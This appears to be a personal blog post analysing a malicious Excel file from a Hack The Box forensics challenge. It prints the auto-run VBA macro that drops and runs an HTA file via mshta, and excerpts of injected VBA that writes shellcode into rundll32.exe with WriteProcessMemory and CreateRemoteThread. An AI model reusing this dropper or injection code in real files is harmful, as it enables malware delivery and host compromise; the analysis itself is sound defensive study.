<!doctype html><html lang=en>
<head>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta http-equiv=content-language content="en">
<meta name=color-scheme content="light dark">
<meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self' utteranc.es; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' utteranc.es static.cloudflareinsights.com; prefetch-src 'self'; connect-src 'self' cloudflareinsights.com;">
<meta name=author content="Brian Stadnicki">
<meta name=description content="Introduction    I started analysing this from finding it on the malware sandbox any.run, only at the end do I notice that it&rsquo;s a Hack The Box challenge.
Sample    This sample is from any.run.
   Property Value     File Type Microsoft Excel 97-2003 Worksheet   File Size 35.6 KB   MD5 b54c993e941836bf2c9c69948b30bcf0   SHA1 a3e6234b5310a3918b9e01c08badf3eb5f44a4b8   SHA256 3861795ece849d6b417a3c9870a7e0a0eccd27f74e706b9242d94d5e8885b705    VBA Extraction    Using olevba, we can view the vba code inside.">
<meta name=keywords content="blog,developer,personal">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="HTB forensics challenge: oBfsC4t10n #93">
<meta name=twitter:description content="Introduction    I started analysing this from finding it on the malware sandbox any.run, only at the end do I notice that it&rsquo;s a Hack The Box challenge.
Sample    This sample is from any.run.
   Property Value     File Type Microsoft Excel 97-2003 Worksheet   File Size 35.6 KB   MD5 b54c993e941836bf2c9c69948b30bcf0   SHA1 a3e6234b5310a3918b9e01c08badf3eb5f44a4b8   SHA256 3861795ece849d6b417a3c9870a7e0a0eccd27f74e706b9242d94d5e8885b705    VBA Extraction    Using olevba, we can view the vba code inside.">
<meta property="og:title" content="HTB forensics challenge: oBfsC4t10n #93">
<meta property="og:description" content="Introduction    I started analysing this from finding it on the malware sandbox any.run, only at the end do I notice that it&rsquo;s a Hack The Box challenge.
Sample    This sample is from any.run.
   Property Value     File Type Microsoft Excel 97-2003 Worksheet   File Size 35.6 KB   MD5 b54c993e941836bf2c9c69948b30bcf0   SHA1 a3e6234b5310a3918b9e01c08badf3eb5f44a4b8   SHA256 3861795ece849d6b417a3c9870a7e0a0eccd27f74e706b9242d94d5e8885b705    VBA Extraction    Using olevba, we can view the vba code inside.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://brianstadnicki.github.io/posts/htb-challenge-93/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-11-25T00:00:00+00:00">
<meta property="article:modified_time" content="2021-11-25T00:00:00+00:00">
<title>
HTB forensics challenge: oBfsC4t10n #93 · Brian Stadnicki
</title>
<link rel=canonical href=https://brianstadnicki.github.io/posts/htb-challenge-93/>
<link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin>
<link rel=stylesheet href=/css/coder.min.708686f8ab8176e91d44fcbe488a0fe0333b94f405cf18a52383d67ba22f0ccb.css integrity="sha256-cIaG+KuBdukdRPy+SIoP4DM7lPQFzxilI4PWe6IvDMs=" crossorigin=anonymous media=screen>
<link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32>
<link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16>
<link rel=apple-touch-icon href=/images/apple-touch-icon.png>
<link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png>
<meta name=generator content="Hugo 0.92.0">
</head>
<body class="preload-transitions colorscheme-light">
<main class=wrapper>
<nav class=navigation>
<section class=container>
<a class=navigation-title href=/>
Brian Stadnicki
</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle>
<i class="fa fa-bars fa-fw" aria-hidden=true></i>
</label>
<ul class=navigation-list>
<li class=navigation-item>
<a class=navigation-link href=/about/>About</a>
</li>
<li class=navigation-item>
<a class=navigation-link href=/posts/>Blog</a>
</li>
<li class=navigation-item>
<a class=navigation-link href=/resume.pdf>Resume</a>
</li>
<li class=navigation-item>
<a class=navigation-link href=/contact/>Contact me</a>
</li>
</ul>
</section>
</nav>
<div class=content>
<section class="container post">
<article>
<header>
<div class=post-title>
<h1 class=title>
<a class=title-link href=https://brianstadnicki.github.io/posts/htb-challenge-93/>
HTB forensics challenge: oBfsC4t10n #93
</a>
</h1>
</div>
<div class=post-meta>
<div class=date>
<span class=posted-on>
<i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2021-11-25T00:00:00Z>
25 November, 2021
</time>
</span>
<span class=reading-time>
<i class="fa fa-clock-o" aria-hidden=true></i>
3-minute read
</span>
</div>
<div class=categories>
<i class="fa fa-folder" aria-hidden=true></i>
<a href=/categories/htb/>htb</a></div>
<div class=tags>
<i class="fa fa-tag" aria-hidden=true></i>
<span class=tag>
<a href=/tags/reverse-engineering/>reverse engineering</a>
</span>
<span class=separator>•</span>
<span class=tag>
<a href=/tags/forensics/>forensics</a>
</span>
<span class=separator>•</span>
<span class=tag>
<a href=/tags/excel/>excel</a>
</span>
<span class=separator>•</span>
<span class=tag>
<a href=/tags/vba/>vba</a>
</span>
<span class=separator>•</span>
<span class=tag>
<a href=/tags/injection/>injection</a>
</span></div>
</div>
</header>
<div>
<h1 id=introduction>
Introduction
<a class=heading-link href=#introduction>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h1>
<p>I started analysing this from finding it on the malware sandbox any.run, only at the end do I notice that it&rsquo;s a Hack The Box challenge.</p>
<h1 id=sample>
Sample
<a class=heading-link href=#sample>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h1>
<p>This sample is from <a href=https://app.any.run/tasks/0c81fc47-2bb2-4724-a1ee-fc5ebde8e4f5/>any.run</a>.</p>
<p><img src=/posts/htb-challenge-93/preview.png alt="Preview of excel sheet"></p>
<table>
<thead>
<tr>
<th>Property</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>File Type</td>
<td>Microsoft Excel 97-2003 Worksheet</td>
</tr>
<tr>
<td>File Size</td>
<td>35.6 KB</td>
</tr>
<tr>
<td>MD5</td>
<td>b54c993e941836bf2c9c69948b30bcf0</td>
</tr>
<tr>
<td>SHA1</td>
<td>a3e6234b5310a3918b9e01c08badf3eb5f44a4b8</td>
</tr>
<tr>
<td>SHA256</td>
<td>3861795ece849d6b417a3c9870a7e0a0eccd27f74e706b9242d94d5e8885b705</td>
</tr>
</tbody>
</table>
<h1 id=vba-extraction>
VBA Extraction
<a class=heading-link href=#vba-extraction>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h1>
<p>Using olevba, we can view the vba code inside.</p>
<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>Sub Auto_Open()
    Dim fHdswUyK, GgyYKuJh
    Application.Goto (&#34;JLprrpFr&#34;)
    GgyYKuJh = Environ(&#34;temp&#34;) &amp; &#34;\LwTHLrGh.hta&#34;

    Open GgyYKuJh For Output As #1
    Write #1, hdYJNJmt(ActiveSheet.Shapes(2).AlternativeText &amp; UZdcUQeJ.yTJtzjKX &amp; Selection)
    Close #1

    fHdswUyK = &#34;msh&#34; &amp; &#34;ta &#34; &amp; GgyYKuJh
    x = Shell(fHdswUyK, 1)
End Sub
</code></pre></div><p>You can see that when the excel file is opened, the output file Environ(&ldquo;temp&rdquo;) & &ldquo;\LwTHLrGh.hta&rdquo; is opened and written with the output from hdYJNJmt(string), then executed using <code>mshta</code>. A <code>.hta</code> file is a Microsoft HTML Application file, which can contain VB or JS.</p>
<h2 id=dumping>
Dumping
<a class=heading-link href=#dumping>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h2>
<p>Simply allow the excel file to run with macros enabled, and find the extracted <code>LwTHLrGh.hta</code> file, in my case at <code>C:\Users\IEUser\AppData\Local\Temp\LwTHLrGh.hta</code>.</p>
<h1 id=lwthlrghhta>
LwTHLrGh.hta
<a class=heading-link href=#lwthlrghhta>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h1>
<p>It appears to open a shell, do something with a registry key about <code>VBOM</code>, and then add a code module to a workbook, using <code>xlmodule.CodeModule.AddFromString ...</code>.</p>
<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>&#39; Run the macro
Set objWorkbook = objExcel.Workbooks.Add()
Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
xlmodule.CodeModule.AddFromString &#34;&#34;Private &#34;&#34;&amp;&#34;&#34;Type PRO&#34;&#34;&amp;&#34;&#34;CESS_INF&#34;&#34;&amp;&#34;&#34;ORMATION&#34;&#34;&amp;Chr(10)&amp;&#34;&#34; ....
</code></pre></div><p>The string appears to simply be a lot of strings concatenated together with some char calls. Replace all the <code>""</code> with <code>"</code> and then simply use something like an <a href=https://www.onlinegdb.com/online_vb_compiler>online vb compiler</a> to evaluate the string.</p>
<h1 id=dynamic-vba>
Dynamic VBA
<a class=heading-link href=#dynamic-vba>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h1>
<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>Private Declare Function CreateStuff Lib &#34;kernel32&#34; Alias &#34;CreateRemoteThread&#34; ...
Private Declare Function AllocStuff Lib &#34;kernel32&#34; Alias &#34;VirtualAllocEx&#34; ...
Private Declare Function WriteStuff Lib &#34;kernel32&#34; Alias &#34;WriteProcessMemory&#34; ...
Private Declare Function RunStuff Lib &#34;kernel32&#34; Alias &#34;CreateProcessA&#34; ...
...
    myArray = Array(...)
    If Len(Environ(&#34;ProgramW6432&#34;)) &gt; 0 Then
        sProc = Environ(&#34;windir&#34;) &amp; &#34;\\SysWOW64\\rundll32.exe&#34;
    Else
        sProc = Environ(&#34;windir&#34;) &amp; &#34;\\System32\\rundll32.exe&#34;
    End If

    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)

    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)
    For offset = LBound(myArray) To UBound(myArray)
        myByte = myArray(offset)
        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)
    Next offset
    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
</code></pre></div><p>In the dynamically loaded VBA, we see that <code>rundll32.exe</code> is ran and <code>myArray</code> written to the process. Unusually, the process executable is ran without any arguments.</p>
<h2 id=extraction>
Extraction
<a class=heading-link href=#extraction>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h2>
<p>To extract the code which is dynamically injected into the <code>rundll32.exe</code> process, I wrote some very basic python to write it to a file. VBA allows bytes to be signed ints, but python requires them to be unsigned.</p>
<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=font-weight:700>with</span> open (<span style=font-style:italic>&#34;out.bin&#34;</span>, <span style=font-style:italic>&#34;wb&#34;</span>) <span style=font-weight:700>as</span> out:
    <span style=font-weight:700>for</span> b <span style=font-weight:700>in</span> myArray:
        out.write((b &amp; 0xff).to_bytes(1, <span style=font-style:italic>&#39;little&#39;</span>))
</code></pre></div><h1 id=rundll32exe>
rundll32.exe
<a class=heading-link href=#rundll32exe>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h1>
<p>Statically analyzing this doesn&rsquo;t seem to give any useful information, and given its size of 1 KB and just calls to <code>ntdll.dll</code>, it&rsquo;s likely that this is just another loader that tries to hide in <code>rundll32.exe</code>. It&rsquo;s quite obfuscated and doesn&rsquo;t seem to have any meaningful structure, so I&rsquo;ll try to gloss over the details of how it works, life is too short for that.</p>
<p>Monitoring it using API Monitor, it appears that it loads some windows DLLs, calls some socket methods, and then has an error and calls windows error handling methods. I&rsquo;ve spotted two interesting calls to <code>RtlUnicodeToUTF8N</code>, inbetween calls getting winsock registry keys and the error handling.</p>
<table>
<thead>
<tr>
<th>Module</th>
<th>API</th>
</tr>
</thead>
<tbody>
<tr>
<td>KERNELBASE.dll</td>
<td>RtlUnicodeToUTF8N ( NULL, 0, 0x04e0ebf0, &ldquo;evil-domain.no/HTB{redacted-for-fun}&rdquo;, 76)</td>
</tr>
<tr>
<td>KERNELBASE.dll</td>
<td>RtlUnicodeToUTF8N ( &ldquo;&rdquo;, 39, 0x04e0ebf0, &ldquo;evil-domain.no/HTB{redacted-for-fun}&rdquo;, 76)</td>
</tr>
</tbody>
</table>
<h1 id=hack-the-box>
Hack The Box
<a class=heading-link href=#hack-the-box>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h1>
<p>Looks like I accidentally found a <a href=https://app.hackthebox.com/challenges/93>Hack The Box challege</a>! <a href=https://www.hackthebox.com/achievement/challenge/833022/93>Challenge completed</a>.</p>
</div>
<footer>
<script src=https://utteranc.es/client.js repo=brianstadnicki/brianstadnicki.github.io issue-term=pathname label theme=preferred-color-scheme crossorigin=anonymous async></script>
</footer>
</article>
</section>
</div>
<footer class=footer>
<section class=container>
<p>Education through a 1000 mistakes</p>
©
2021 -
2022
Brian Stadnicki
·
Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.
</section>
</footer>
</main>
<script src=/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js integrity="sha256-A7F3afT5GuNWZ+HyocqMFvUFYlds+Q/zKzF5kmkU2qU="></script>
<script defer src=https://static.cloudflareinsights.com/beacon.min.js data-cf-beacon='{"token": "f5dd1cc794e748f0a1fa431f62434694"}'></script>
</body>
</html>